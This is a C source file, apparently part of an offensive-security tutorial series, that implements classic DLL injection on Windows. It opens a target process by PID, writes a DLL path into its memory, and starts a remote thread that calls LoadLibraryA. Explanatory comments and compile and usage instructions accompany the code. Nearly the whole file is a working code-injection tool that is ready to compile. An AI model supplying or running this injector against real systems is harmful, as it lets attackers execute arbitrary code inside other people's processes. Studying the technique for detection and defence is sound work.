/*
 * 03_dll_injection_classica.c
 * ============================
 * Classic DLL Injection via CreateRemoteThread
 *
 * Flow:
 *   1. Open the target process (requires the PID)
 *   2. Allocate memory INSIDE the target process
 *   3. Write the malicious DLL path into that memory
 *   4. Create a remote thread that calls LoadLibraryA with the path
 *   5. Windows loads the DLL into the target process and executes DllMain
 *
 * This is the MOST detected technique by EDRs. All APIs used
 * (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)
 * are highly monitored. It serves as a foundation for understanding more advanced ones.
 *
 * Compile: cl.exe /O2 03_dll_injection_classica.c
 * Usage: 03_dll_injection_classica.exe <PID> <dll_path>
 */

#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {

    if (argc != 3) {
        printf("Usage: %s <PID> <dll_path>\n", argv[0]);
        printf("Example: %s 1234 C:\\payload.dll\n", argv[0]);
        return 1;
    }

    /* ---------------------------------------------------------------
     * Get PID and DLL path from arguments
     *
     * atoi() converts string to integer: "1234" -> 1234
     * The PID uniquely identifies each process in Windows.
     * You can get the PID from Task Manager or via CreateToolhelp32Snapshot.
     * --------------------------------------------------------------- */
    DWORD pid = atoi(argv[1]);
    const char* dllPath = argv[2];
    size_t pathSize = strlen(dllPath) + 1; /* +1 for the trailing \0 */

    printf("[*] Target: PID %lu\n", pid);
    printf("[*] DLL: %s\n", dllPath);

    /* ---------------------------------------------------------------
     * STEP 1: Open handle to the target process
     *
     * OpenProcess returns a HANDLE - think of it as a "remote control"
     * that allows interacting with the process in another way.
     *
     * PROCESS_ALL_ACCESS = full permissions (read, write, create threads)
     * FALSE = don't inherit the handle to child processes
     * pid = which process we want to open
     *
     * If this fails, it's usually a privilege issue.
     * Needs to run as admin or have SeDebugPrivilege.
     * --------------------------------------------------------------- */
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("[!] Failed to open process. Error: %lu\n", GetLastError());
        printf("    Hint: run as Administrator\n");
        return 1;
    }
    printf("[+] Process handle: 0x%p\n", hProcess);

    /* ---------------------------------------------------------------
     * STEP 2: Allocate memory INSIDE the target process
     *
     * VirtualAllocEx is the same as VirtualAlloc, but the "Ex" means
     * it operates on ANOTHER process (specified by the handle).
     *
     * The allocated memory belongs to the target process, not ours.
     * We allocate enough space to store the DLL path.
     *
     * PAGE_READWRITE = need to write the path and then read it
     * --------------------------------------------------------------- */
    void* remoteMemory = VirtualAllocEx(
        hProcess,       /* which process to allocate in */
        NULL,           /* Windows chooses the address */
        pathSize,       /* size = length of the DLL path */
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (remoteMemory == NULL) {
        printf("[!] Failed to allocate remote memory. Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Memory allocated in target at: 0x%p\n", remoteMemory);

    /* ---------------------------------------------------------------
     * STEP 3: Write the DLL path into the target process memory
     *
     * WriteProcessMemory copies bytes from OUR process to the TARGET.
     *
     * After this call, inside the target process there is a string
     * with the full path to our DLL (e.g.: "C:\payload.dll")
     * --------------------------------------------------------------- */
    SIZE_T bytesWritten = 0;
    BOOL result = WriteProcessMemory(
        hProcess,       /* which process to write to */
        remoteMemory,   /* destination address (inside the target) */
        dllPath,        /* source data (our DLL path) */
        pathSize,       /* how many bytes to copy */
        &bytesWritten   /* how many bytes were actually copied */
    );

    if (!result) {
        printf("[!] Failed to write to memory. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] DLL path written (%zu bytes)\n", bytesWritten);

    /* ---------------------------------------------------------------
     * STEP 4: Get the address of LoadLibraryA
     *
     * LoadLibraryA is the Windows function that loads DLLs.
     * It exists inside kernel32.dll, which is loaded in ALL
     * Windows processes at the SAME address (ASLR doesn't affect
     * kernel32 across processes in the same session in most cases).
     *
     * So the address of LoadLibraryA in OUR process is the same
     * address in the target process. This is key for the technique to work.
     *
     * GetModuleHandleA("kernel32.dll") -> gets the base address of kernel32
     * GetProcAddress(handle, "LoadLibraryA") -> gets the function address
     *
     * The cast to LPTHREAD_START_ROUTINE is because CreateRemoteThread
     * expects a function pointer with a specific signature:
     *   DWORD WINAPI function(LPVOID parameter)
     * LoadLibraryA accepts one parameter (the path) and returns a DWORD,
     * so the signatures are compatible.
     * --------------------------------------------------------------- */
    LPTHREAD_START_ROUTINE loadLibraryAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(
        GetModuleHandleA("kernel32.dll"),
        "LoadLibraryA"
    );

    if (loadLibraryAddress == NULL) {
        printf("[!] LoadLibraryA not found\n");
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] LoadLibraryA at: 0x%p\n", loadLibraryAddress);

    /* ---------------------------------------------------------------
     * STEP 5: Create remote thread in the target process
     *
     * CreateRemoteThread creates a new thread INSIDE another process.
     *
     * The thread will execute LoadLibraryA(remoteMemory).
     * Since remoteMemory contains the DLL path, this is equivalent to:
     *   LoadLibraryA("C:\\payload.dll")
     *
     * Windows will load payload.dll into the target process and execute
     * the DllMain function automatically (with DLL_PROCESS_ATTACH).
     *
     * From here, our code runs INSIDE the target process,
     * with the same permissions and context.
     * --------------------------------------------------------------- */
    HANDLE hThread = CreateRemoteThread(
        hProcess,              /* which process to create the thread in */
        NULL,                  /* no security attributes */
        0,                     /* default stack */
        loadLibraryAddress,    /* function to execute = LoadLibraryA */
        remoteMemory,          /* parameter = DLL path */
        0,                     /* execute immediately */
        NULL                   /* don't need the thread ID */
    );

    if (hThread == NULL) {
        printf("[!] Failed to create remote thread. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    printf("[+] Remote thread created! DLL injected.\n");
    printf("[*] Waiting for execution...\n");

    /* Wait for the thread to finish (LoadLibraryA to return) */
    WaitForSingleObject(hThread, 5000); /* 5 second timeout */

    /* Clean up handles */
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    printf("[+] Done.\n");
    return 0;
}
